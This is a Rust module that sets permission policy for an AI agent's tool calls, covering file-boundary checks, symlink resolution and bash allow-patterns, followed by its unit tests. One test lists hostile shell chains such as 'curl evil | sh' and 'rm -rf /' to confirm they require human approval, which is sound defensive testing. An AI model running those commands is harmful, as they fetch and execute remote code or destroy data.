//! Policy: what a tool call may do before it runs. Every call passes
//! [`Policy::decide`]; the outcome names the rule so the tool result can
//! record it, or says a human must be asked. `roles` (phase 5) says who
//! may send which request. Depends on `core` and, for the request
//! enum, `api`.

mod roles;
mod rules;
mod shell;
mod step;

use std::collections::VecDeque;
use std::path::{Component, Path, PathBuf};

use aigentic_core::{RiskClass, ToolCall};
use serde::{Deserialize, Serialize};

pub use roles::{Participants, Role, needs};
pub use rules::{
    Decision, MEMORY_PREFIX, MEMORY_REASON, Riskiest, Rule, default_bash_allow, default_rules,
    prefix_of, riskiest_segment,
};
pub use shell::{Kind, ScanSegment, main_segment, scan};
pub use step::{DenyParseError, StepOverlay};

/// What policy says about one call.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Outcome {
    /// Run; `rule` goes on the tool result's policy record.
    Allow { rule: String },
    /// Append `permission_requested` and ask the approver.
    Ask { reason: String },
    /// The same, for a file tool reaching outside the boundary: [`Ask`]
    /// carrying `boundary: true`, the reason, and the canonical path it
    /// would reach. The runtime tells the two apart: a mode never waves
    /// this one through, a step refuses it, and a session grant covers
    /// only this path's own directory (issue #124). `path` is `None` for
    /// a relative path with no directory to resolve it against: nothing
    /// can be proven inside, so it asks and no grant answers it.
    ///
    /// [`Ask`]: Outcome::Ask
    AskBoundary {
        reason: String,
        path: Option<PathBuf>,
    },
    /// Refuse with an error tool result naming `rule` and, when the rule
    /// has one, its `reason`.
    Deny { rule: String, reason: String },
}

/// The file boundary (issue #124): the directories a file tool reaches
/// without asking a person. Every root is canonical, so a symlink in a
/// path is judged by where it lands.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Boundary {
    pub roots: Vec<PathBuf>,
}

impl Boundary {
    /// Whether canonical `path` is a root or below one. Compared by
    /// component, so `/tmp/x` is not inside `/tmp/xyz`.
    pub fn is_inside(&self, path: &Path) -> bool {
        self.roots.iter().any(|r| path == r || path.starts_with(r))
    }
}

/// The file tools the boundary checks. `bash` and the MCP tools that take
/// a path are not confined: they reach the whole disk until the sandbox
/// (`docs/PLAN-phase3.md` section 15 item 6).
pub const FILE_TOOLS: [&str; 5] = ["read_file", "write_file", "edit_file", "list_dir", "grep"];

/// The rule set and bash allow patterns. `rules` is evaluated first match
/// wins; a call matching no rule asks. A rule is **narrower than the
/// boundary, never wider** (issue #124): it can only decide a call inside
/// a boundary root, because a rule that would allow an outside path never
/// sees one — `Policy::decide` returns `AskBoundary` before reading the
/// table. `[policy] allow_paths` is the one way to add a root.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Policy {
    pub rules: Vec<Rule>,
    /// Word-prefix patterns for `bash` commands, e.g. `cargo test`, `ls`.
    pub bash_allow: Vec<String>,
    /// The project root that `path_prefix` rules are relative to, and
    /// the tools' working directory that relative `path` arguments are
    /// resolved from. Set by the client; unset, a `path` argument is
    /// compared as given.
    #[serde(skip)]
    pub root: Option<PathBuf>,
    #[serde(skip)]
    pub cwd: Option<PathBuf>,
    /// Patterns a person allowed "from now on" (phase 6 step 7), kept
    /// apart from `bash_allow` so a project's replacement list does not
    /// drop them. Loaded from and appended to `rules_file`.
    #[serde(skip)]
    pub allowed_prefixes: Vec<String>,
    #[serde(skip)]
    pub rules_file: Option<PathBuf>,
    /// The file boundary (issue #124). Empty, nothing is inside, so every
    /// checked call asks.
    #[serde(skip)]
    pub boundary: Boundary,
}

impl Default for Policy {
    fn default() -> Self {
        Self::defaults()
    }
}

impl Policy {
    /// The table in `docs/PLAN-phase3.md` section 4.
    pub fn defaults() -> Self {
        Self {
            rules: default_rules(),
            bash_allow: default_bash_allow(),
            root: None,
            cwd: None,
            allowed_prefixes: Vec::new(),
            rules_file: None,
            boundary: Boundary::default(),
        }
    }

    /// The rules file: `.aigentic/rules.toml` in a project, else the
    /// config directory's. Its `allow` patterns join the allow list;
    /// `allow_prefix` appends there.
    pub fn with_rules_file(mut self, path: &Path) -> Self {
        self.allowed_prefixes = rules::load_rules_file(path);
        self.rules_file = Some(path.to_path_buf());
        self
    }

    /// Allow `pattern` (words a command must start with) from now on:
    /// in memory, and in the rules file when there is one. Returns where
    /// it was written.
    pub fn allow_prefix(&mut self, pattern: &str) -> std::io::Result<Option<PathBuf>> {
        let pattern = pattern.split_whitespace().collect::<Vec<_>>().join(" ");
        if pattern.is_empty() {
            return Ok(None);
        }
        if !self.allowed_prefixes.contains(&pattern) {
            self.allowed_prefixes.push(pattern.clone());
        }
        match &self.rules_file {
            Some(path) => {
                rules::append_rules_file(path, &pattern)?;
                Ok(Some(path.clone()))
            }
            None => Ok(None),
        }
    }

    /// Where `path_prefix` rules are anchored, relative paths resolve,
    /// and the first boundary root. Call it before
    /// [`with_boundary_roots`](Self::with_boundary_roots), which appends.
    pub fn with_root(mut self, root: &Path, cwd: &Path) -> Self {
        self.root = Some(root.to_path_buf());
        self.cwd = Some(cwd.to_path_buf());
        self.boundary = Boundary {
            roots: vec![canonicalise(root)],
        };
        self
    }

    /// The rest of the file boundary (issue #124): the temp directory, the
    /// skill folders, `[policy] allow_paths`. Every root is canonicalised
    /// here, so a caller may hand over a path that does not exist yet or
    /// that leads through a symlink.
    pub fn with_boundary_roots(mut self, roots: impl IntoIterator<Item = PathBuf>) -> Self {
        self.boundary
            .roots
            .extend(roots.into_iter().map(|r| canonicalise(&r)));
        self
    }

    /// The boundary's roots, canonical, in the order they were set.
    pub fn boundary_roots(&self) -> &[PathBuf] {
        &self.boundary.roots
    }

    /// The path a checked call will reach, canonical, or `None` when the
    /// boundary does not check it: a tool outside [`FILE_TOOLS`], or a
    /// `read_file`/`write_file`/`edit_file` call with no `path` (the tool
    /// rejects that before touching disk). `Err` carries the path as
    /// given when a relative one has no directory to resolve against:
    /// nothing can be proven inside, so it is treated as outside.
    fn boundary_target(
        &self,
        call: &ToolCall,
        cwd: Option<&Path>,
    ) -> Option<Result<PathBuf, String>> {
        if !FILE_TOOLS.contains(&call.name.as_str()) {
            return None;
        }
        let raw = match call.args.get("path").and_then(|p| p.as_str()) {
            Some(raw) => raw,
            // `list_dir` and `grep` take the working directory with no
            // `path` at all; the other three have no call left to check.
            None if call.name == "list_dir" || call.name == "grep" => ".",
            None => return None,
        };
        if Path::new(raw).is_absolute() {
            return Some(Ok(canonicalise(Path::new(raw))));
        }
        match cwd.or(self.cwd.as_deref()) {
            Some(cwd) => Some(Ok(canonicalise(&cwd.join(raw)))),
            // No directory to resolve it against: fail closed rather
            // than judge a relative path against the process's own.
            None => Some(Err(raw.to_owned())),
        }
    }

    /// The call's `path` argument relative to the project root with `/`
    /// separators, or `None` when there is no such argument or the path
    /// lies outside the root. Lexical only: nothing is touched on disk.
    /// `cwd` is the runtime's live working directory, so a rule still
    /// matches after a `cd` inside the project; `None` falls back to the
    /// one this policy was built with.
    pub fn project_path(&self, call: &ToolCall, cwd: Option<&Path>) -> Option<String> {
        let raw = call.args.get("path")?.as_str()?;
        let (Some(root), Some(cwd)) = (&self.root, cwd.or(self.cwd.as_deref())) else {
            return Some(raw.replace('\\', "/"));
        };
        let joined = if Path::new(raw).is_absolute() {
            PathBuf::from(raw)
        } else {
            cwd.join(raw)
        };
        let abs = normalise(&joined);
        let rel = abs.strip_prefix(normalise(root)).ok()?;
        Some(
            rel.components()
                .map(|c| c.as_os_str().to_string_lossy().into_owned())
                .collect::<Vec<_>>()
                .join("/"),
        )
    }

    /// The defaults with `prepend` evaluated first and, when given,
    /// `bash_allow` replacing the default patterns. This is what
    /// `[policy]` in `aigentic.toml` maps to.
    pub fn configured(prepend: Vec<Rule>, bash_allow: Option<Vec<String>>) -> Self {
        let mut policy = Self::defaults();
        let mut rules = prepend;
        rules.append(&mut policy.rules);
        policy.rules = rules;
        if let Some(patterns) = bash_allow {
            policy.bash_allow = patterns;
        }
        policy
    }

    /// First matching rule wins. No rule matching is `Ask`, so a class
    /// added later can never run silently.
    ///
    /// A file tool reaching outside the boundary is `AskBoundary` before
    /// any rule is read (issue #124): no rule, no mode and no session
    /// grant may allow an outside path without a person, and the runtime
    /// refuses one in a step. `cwd` is the runtime's live working
    /// directory.
    pub fn decide(&self, call: &ToolCall, class: RiskClass, cwd: Option<&Path>) -> Outcome {
        if let Some(target) = self.boundary_target(call, cwd) {
            let outside = match target {
                Ok(path) if self.boundary.is_inside(&path) => None,
                Ok(path) => Some((path.display().to_string(), Some(path))),
                // As given: there is nothing canonical to show.
                Err(raw) => Some((raw, None)),
            };
            if let Some((shown, path)) = outside {
                return Outcome::AskBoundary {
                    reason: format!("outside this project: {shown}"),
                    path,
                };
            }
        }
        for rule in &self.rules {
            if !rule.tool_matches(&call.name) {
                continue;
            }
            if rule.class.is_some_and(|c| c != class) {
                continue;
            }
            if let Some(prefix) = &rule.path_prefix {
                let Some(path) = self.project_path(call, cwd) else {
                    continue;
                };
                let prefix = prefix.trim_start_matches("./");
                let under = path == prefix.trim_end_matches('/') || path.starts_with(prefix);
                if !under {
                    continue;
                }
            }
            let mut name = rule.name();
            if rule.command_allowed {
                let Some(pattern) = self.allowed_by(call) else {
                    continue;
                };
                name = format!("{name} {pattern}");
            }
            return match rule.decision {
                Decision::Allow => Outcome::Allow { rule: name },
                Decision::Deny => Outcome::Deny {
                    rule: name,
                    reason: rule.reason.clone(),
                },
                Decision::Ask => Outcome::Ask {
                    reason: if rule.reason.is_empty() {
                        format!("{name}: ask")
                    } else {
                        format!("{name}: {}", rule.reason)
                    },
                },
            };
        }
        Outcome::Ask {
            reason: format!(
                "no rule matches {} (class {})",
                call.name,
                rules::class_name(class)
            ),
        }
    }

    /// What the allow rule matches in a `bash` call's command, if
    /// anything: the allow patterns and grants its segments matched,
    /// joined — `cargo test`, `grep, head` — or `harmless` when the
    /// line is only `cd` and assignments. A line that is not read-only
    /// through and through (issue #15) matches nothing and asks.
    pub fn allowed_by(&self, call: &ToolCall) -> Option<String> {
        if call.name != "bash" {
            return None;
        }
        let command = call.args.get("command")?.as_str()?;
        let classified = shell::classify(command, &self.bash_allow, &self.allowed_prefixes);
        if !classified.allowed {
            return None;
        }
        Some(if classified.patterns.is_empty() {
            "harmless".to_owned()
        } else {
            classified.patterns.join(", ")
        })
    }
}

/// Resolve `.` and `..` lexically.
fn normalise(path: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for c in path.components() {
        match c {
            Component::CurDir => {}
            Component::ParentDir => {
                out.pop();
            }
            other => out.push(other.as_os_str()),
        }
    }
    out
}

/// How many symlink hops a hand resolution follows before giving up,
/// the kernel's own limit.
const MAX_SYMLINK_HOPS: usize = 40;

/// A path no boundary root contains. Resolution answers with it when it
/// cannot say where a path lands — a symlink chain past
/// [`MAX_SYMLINK_HOPS`], or a loop — so the call asks instead of being
/// judged inside.
fn unresolvable() -> PathBuf {
    PathBuf::from("/")
}

/// The canonical form of `path`, for the boundary's containment checks:
/// symlinks resolved, so a link out of the project is judged by where it
/// lands, and a path that does not exist yet answers with its nearest
/// real ancestor plus the rest. `link/..` is the *link's* own parent
/// directory, as the kernel reads it, because the whole path is
/// canonicalised in one call when it exists.
///
/// Only the part below the deepest prefix that exists is walked. A
/// component `canonicalize()` cannot follow — a symlink whose target
/// does not exist — is read by [`std::fs::read_link`] and its target
/// spliced in, so a dangling link is judged by where it points. Past
/// [`MAX_SYMLINK_HOPS`] hops, or on a loop, the answer is
/// [`unresolvable`].
pub fn canonicalise(path: &Path) -> PathBuf {
    // Each component as its own one-step path, so a symlink target read
    // later can be spliced in front of what is still to come.
    let mut pending: VecDeque<PathBuf> = path
        .components()
        .map(|c| PathBuf::from(c.as_os_str()))
        .collect();
    // The deepest prefix that exists, canonicalised in one call; the
    // components below it are what the walk has left to do.
    let mut below: Vec<PathBuf> = Vec::new();
    let mut out = loop {
        let candidate: PathBuf = pending.iter().collect();
        if let Ok(real) = candidate.canonicalize() {
            break real;
        }
        match pending.pop_back() {
            Some(component) => below.push(component),
            None => break PathBuf::new(),
        }
    };
    let mut pending: VecDeque<PathBuf> = below.into_iter().rev().collect();

    // `true` while the prefix does not exist: nothing under a missing
    // directory can exist either, so the walk stops asking the disk —
    // until a `..` climbs back to a directory that does.
    let mut missing = false;
    let mut hops = 0usize;
    while let Some(step) = pending.pop_front() {
        match step.components().next() {
            Some(Component::Prefix(prefix)) => {
                out.push(prefix.as_os_str());
                missing = false;
            }
            Some(Component::RootDir) => {
                out.push(Component::RootDir.as_os_str());
                missing = false;
            }
            // `.` is the prefix itself.
            Some(Component::CurDir) => continue,
            // `..` names the parent of whatever the prefix is *called*,
            // whether or not it exists, as the kernel reads it.
            Some(Component::ParentDir) => {
                out.pop();
                missing = false;
                continue;
            }
            Some(Component::Normal(name)) => out.push(name),
            None => continue,
        }
        if missing {
            continue;
        }
        if let Ok(real) = out.canonicalize() {
            out = real;
            continue;
        }
        let symlink = out
            .symlink_metadata()
            .map(|meta| meta.file_type().is_symlink())
            .unwrap_or(false);
        if !symlink {
            missing = true;
            continue;
        }
        hops += 1;
        if hops > MAX_SYMLINK_HOPS {
            return unresolvable();
        }
        let Ok(target) = std::fs::read_link(&out) else {
            return unresolvable();
        };
        // The link's own name is gone; a relative target resolves
        // against the link's parent, an absolute one from the root.
        out.pop();
        if target.is_absolute() {
            out = PathBuf::new();
        }
        let target: Vec<PathBuf> = target
            .components()
            .map(|c| PathBuf::from(c.as_os_str()))
            .collect();
        for step in target.into_iter().rev() {
            pending.push_front(step);
        }
        missing = false;
    }
    out
}

/// `command`'s leading words equal `pattern`'s words, and the rest of
/// the line is read-only by the same rules: the matcher that backs
/// the allow rule, which classifies a command line one segment at a
/// time (issue #15).
pub fn command_matches(command: &str, pattern: &str) -> bool {
    let allow = [pattern.to_owned()];
    let classified = shell::classify(command, &allow, &[]);
    classified.allowed && classified.patterns.first().map(String::as_str) == Some(pattern)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn call(name: &str, args: serde_json::Value) -> ToolCall {
        ToolCall {
            id: "c".into(),
            name: name.into(),
            args,
        }
    }
    fn bash(command: &str) -> ToolCall {
        call("bash", json!({"command": command}))
    }
    fn allow(rule: &str) -> Outcome {
        Outcome::Allow { rule: rule.into() }
    }

    #[test]
    fn the_default_table() {
        let p = Policy::defaults();
        assert_eq!(
            p.decide(&call("pin", json!({})), RiskClass::Safe, None),
            allow("class safe")
        );
        assert_eq!(
            p.decide(&call("read_file", json!({})), RiskClass::Read, None),
            allow("class read")
        );
        assert_eq!(
            p.decide(&bash("cargo test -p x"), RiskClass::Exec, None),
            allow("bash allow-pattern cargo test")
        );
        assert!(matches!(
            p.decide(&bash("rm -rf target"), RiskClass::Exec, None),
            Outcome::Ask { reason } if reason == "class exec: anything else in a shell"
        ));
        assert!(matches!(
            p.decide(&call("write_file", json!({})), RiskClass::Write, None),
            Outcome::Ask { reason } if reason.starts_with("class write")
        ));
        assert!(matches!(
            p.decide(&call("mcp.docs.search", json!({})), RiskClass::Network, None),
            Outcome::Ask { reason } if reason.starts_with("class network")
        ));
        // An MCP tool a human downgraded to read still allows: class rules
        // come first. Only an unknown class reaches the `mcp.*` row.
        assert_eq!(
            p.decide(&call("mcp.docs.search", json!({})), RiskClass::Read, None),
            allow("class read")
        );
    }

    #[test]
    fn first_match_wins_with_a_prepended_rule() {
        let p = Policy::configured(
            vec![Rule::class(
                RiskClass::Write,
                Decision::Allow,
                "trusted repo",
            )],
            None,
        );
        assert_eq!(
            p.decide(&call("write_file", json!({})), RiskClass::Write, None),
            allow("class write")
        );
        let p = Policy::configured(
            vec![Rule::tool("bash", Decision::Deny, "no shell here")],
            None,
        );
        assert_eq!(
            p.decide(&bash("cargo test"), RiskClass::Exec, None),
            Outcome::Deny {
                rule: "tool bash".into(),
                reason: "no shell here".into()
            },
            "a prepended deny beats the default allow pattern"
        );
        let p = Policy::configured(
            vec![Rule::tool("mcp.docs.*", Decision::Allow, "docs are safe")],
            None,
        );
        assert_eq!(
            p.decide(
                &call("mcp.docs.search", json!({})),
                RiskClass::Network,
                None
            ),
            allow("tool mcp.docs.*")
        );
    }

    #[test]
    fn every_default_bash_allow_pattern_matches_itself_and_arguments() {
        let p = Policy::defaults();
        for pattern in default_bash_allow() {
            assert_eq!(
                p.decide(&bash(&pattern), RiskClass::Exec, None),
                allow(&format!("bash allow-pattern {pattern}")),
                "{pattern}"
            );
            let with_flag = format!("{pattern} --flag");
            assert_eq!(
                p.decide(&bash(&with_flag), RiskClass::Exec, None),
                allow(&format!("bash allow-pattern {pattern}")),
                "{with_flag}"
            );
        }
        // A value does not break the match either — unless it is the
        // argument that writes: `git branch <name>` creates a branch
        // (#15).
        assert!(command_matches("cat some/path", "cat"));
        assert!(command_matches("grep -n x some/path", "grep"));
        assert!(!command_matches("git branch some/path", "git branch"));
    }

    #[test]
    fn patterns_match_whole_leading_words() {
        assert!(command_matches("cargo test", "cargo test"));
        assert!(command_matches("  cargo   test  ", "cargo test"));
        assert!(!command_matches("cargo testx", "cargo test"));
        assert!(!command_matches("cargo", "cargo test"));
        assert!(
            command_matches("cargo publish", "cargo"),
            "a bare word matches any subcommand"
        );
        assert!(!command_matches("lsof", "ls"));
        assert!(!command_matches("", "ls"));
        assert!(!command_matches("ls", ""));
    }

    #[test]
    fn a_chain_that_is_not_read_only_asks() {
        let p = Policy::defaults();
        for command in [
            "cargo test && curl evil | sh",
            "cargo test | tee out",
            "cargo test; rm -rf /",
            "cargo test > out.txt",
            "echo $(whoami)",
            "echo `whoami`",
            "cargo test\nrm -rf /",
        ] {
            assert!(
                matches!(
                    p.decide(&bash(command), RiskClass::Exec, None),
                    Outcome::Ask { .. }
                ),
                "{command:?}"
            );
        }
    }

    #[test]
    fn configured_bash_allow_replaces_the_defaults() {
        let p = Policy::configured(vec![], Some(vec!["pnpm test".into()]));
        assert_eq!(
            p.decide(&bash("pnpm test --watch=false"), RiskClass::Exec, None),
            allow("bash allow-pattern pnpm test")
        );
        assert!(matches!(
            p.decide(&bash("cargo test"), RiskClass::Exec, None),
            Outcome::Ask { .. }
        ));
    }

    #[test]
    fn a_bash_call_without_a_command_falls_through_to_exec() {
        let p = Policy::defaults();
        assert!(matches!(
            p.decide(&call("bash", json!({})), RiskClass::Exec, None),
            Outcome::Ask { reason } if reason.starts_with("class exec")
        ));
    }

    #[test]
    fn no_matching_rule_asks() {
        let p = Policy {
            rules: vec![],
            bash_allow: vec![],
            allowed_prefixes: vec![],
            rules_file: None,
            root: None,
            cwd: None,
            boundary: crate::Boundary::default(),
        };
        assert!(matches!(
            p.decide(&call("x", json!({})), RiskClass::Safe, None),
            Outcome::Ask { reason } if reason == "no rule matches x (class safe)"
        ));
    }

    #[test]
    fn rules_deserialise_from_the_config_shape() {
        let rules: Vec<Rule> = toml::from_str::<toml::Table>(
            "rules = [{ class = \"write\", decision = \"allow\" }, { tool = \"mcp.docs.*\", decision = \"deny\", reason = \"no\" }]",
        )
        .unwrap()["rules"]
            .clone()
            .try_into()
            .unwrap();
        assert_eq!(
            rules[0],
            Rule {
                tool: None,
                class: Some(RiskClass::Write),
                path_prefix: None,
                command_allowed: false,
                decision: Decision::Allow,
                reason: String::new()
            }
        );
        assert_eq!(rules[1].tool.as_deref(), Some("mcp.docs.*"));
        assert_eq!(rules[1].decision, Decision::Deny);
        let err = toml::from_str::<Rule>("decision = \"allow\"\nbogus = 1\n").unwrap_err();
        assert!(err.to_string().contains("bogus"));
    }
    #[test]
    fn the_memory_folder_refuses_model_writes_and_nothing_else_does() {
        let root = Path::new("/repo");
        let p = Policy::defaults().with_root(root, &root.join("packages/verify"));
        for tool in ["write_file", "edit_file"] {
            for path in [
                "/repo/.aigentic/memory/facts.md",
                "../../.aigentic/memory/decisions.md",
                "../../.aigentic/./memory/x.md",
            ] {
                assert_eq!(
                    p.decide(&call(tool, json!({"path": path})), RiskClass::Write, None),
                    Outcome::Deny {
                        rule: format!("tool {tool} path .aigentic/memory/"),
                        reason: MEMORY_REASON.into()
                    },
                    "{tool} {path}"
                );
            }
            for path in [
                "/repo/.aigentic/knowledge/x.md",
                "../../docs/memory.md",
                "../../.aigentic/memory-notes.md",
            ] {
                assert!(
                    matches!(
                        p.decide(&call(tool, json!({"path": path})), RiskClass::Write, None),
                        Outcome::Ask { .. }
                    ),
                    "{tool} {path}"
                );
            }
            // A path outside the root is the boundary's before the memory
            // deny's (issue #124): the deny only ever spoke about the
            // project's own `.aigentic/memory/`.
            assert!(
                matches!(
                    p.decide(
                        &call(
                            tool,
                            json!({"path": "/elsewhere/.aigentic/memory/facts.md"})
                        ),
                        RiskClass::Write,
                        None
                    ),
                    Outcome::AskBoundary { .. }
                ),
                "{tool} outside"
            );
        }
        assert!(matches!(
            p.decide(
                &call(
                    "read_file",
                    json!({"path": "/repo/.aigentic/memory/facts.md"})
                ),
                RiskClass::Read,
                None
            ),
            Outcome::Allow { .. }
        ));
        // Without a root nothing is inside the boundary, so even a
        // relative path asks before any rule is read (issue #124): a
        // mis-built runtime must not be unconfined, and the memory deny is
        // not consulted. With no directory either, the relative path
        // still asks: nothing can be proven inside.
        let bare = Policy::defaults();
        for cwd in [Some(Path::new("/repo")), None] {
            assert!(matches!(
                bare.decide(
                    &call("write_file", json!({"path": ".aigentic/memory/facts.md"})),
                    RiskClass::Write,
                    cwd
                ),
                Outcome::AskBoundary { .. }
            ));
        }
        assert!(matches!(
            bare.decide(
                &call(
                    "write_file",
                    json!({"path": "/x/.aigentic/memory/facts.md"})
                ),
                RiskClass::Write,
                None
            ),
            Outcome::AskBoundary { .. }
        ));
        let rule: Rule = toml::from_str(
            "tool = \"write_file\"\npath_prefix = \"secrets/\"\ndecision = \"deny\"\n",
        )
        .unwrap();
        assert_eq!(rule.path_prefix.as_deref(), Some("secrets/"));
        assert_eq!(rule.name(), "tool write_file path secrets/");
    }
}
